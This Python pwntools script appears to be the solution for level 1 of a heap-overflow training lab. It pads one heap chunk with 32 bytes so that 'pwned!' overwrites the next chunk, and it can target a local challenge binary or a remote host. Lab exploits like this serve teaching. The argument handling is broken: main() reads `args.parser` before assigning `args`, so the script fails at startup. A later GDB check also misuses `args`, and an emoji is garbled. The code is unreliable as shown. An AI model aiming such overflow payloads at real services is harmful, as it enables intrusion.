#!/usr/bin/env python3
"""
Level 1: Heap Overflow Exploit

This script demonstrates how to exploit a basic heap overflow
vulnerability to control adjacent chunk data.

Usage:
    python3 exploit.py
"""

from pwn import *

# Configure pwntools
context.log_level = 'info'
context.encoding = 'latin1'

def exploit(p):
    """
    Exploit the heap overflow vulnerability.

    Strategy:
    1. Fill chunk1 with 32 bytes of padding
    2. Continue writing into chunk2 with "pwned!"
    3. Trigger the winner() function
    """

    log.info("=== Level 1: Heap Overflow Exploit ===")

    # Build the payload
    # - 32 bytes of padding to fill chunk1
    # - "pwned!" to overflow into chunk2
    payload = flat([
        b"A" * 32,      # Padding to fill chunk1
        b"pwned!",      # Target string to overflow into chunk2
    ])

    log.info(f"Payload length: {len(payload)} bytes")
    log.info(f"Payload: {payload[:50]}...")

    # Wait for the prompt
    p.recvuntil(b'Enter data for chunk1')

    # Send the payload
    log.info("Sending payload...")
    p.sendline(payload)

    # Receive and check the response
    try:
        response = p.recvall(timeout=2)

        if b"Congratulations" in response:
            log.success("Exploit successful! ðŸŽ‰")
            print("\n" + "="*50)
            print(response.decode())
            print("="*50)
            return True
        else:
            log.failure("Exploit failed!")
            print(response.decode())
            return False

    except EOFError:
        log.error("Program crashed!")
        return False

def main():
    """Main exploit function"""

    # Parse arguments
    parser = args.parser
    parser.add_argument('--remote', action='store_true',
                       help='Connect to remote server')
    parser.add_argument('--host', type=str, default='localhost',
                       help='Remote host')
    parser.add_argument('--port', type=int, default=8888,
                       help='Remote port')
    args = parser.parse_args()

    if args.remote:
        # Remote exploitation
        log.info(f"Connecting to {args.host}:{args.port}")
        p = remote(args.host, args.port)
    else:
        # Local exploitation
        binary_path = './challenge/vuln'

        # Check if binary exists
        if not os.path.exists(binary_path):
            log.error(f"Binary not found: {binary_path}")
            log.error("Run from the level01_overflow directory")
            return

        # Check if flag file exists
        flag_file = './challenge/flag.txt'
        if not os.path.exists(flag_file):
            log.warning("Flag file not found, creating it...")
            with open(flag_file, 'w') as f:
                f.write("flag{heap_overflow_master_level1}\n")

        log.info("Starting local process...")
        p = process(binary_path)

        # Optional: Attach GDB for debugging
        if args.GDB:
            gdb.attach(p, '''
                break main
                continue
            ''')

    # Run the exploit
    success = exploit(p)

    # Close the process
    p.close()

    # Exit with appropriate code
    return 0 if success else 1

if __name__ == "__main__":
    exit(main())
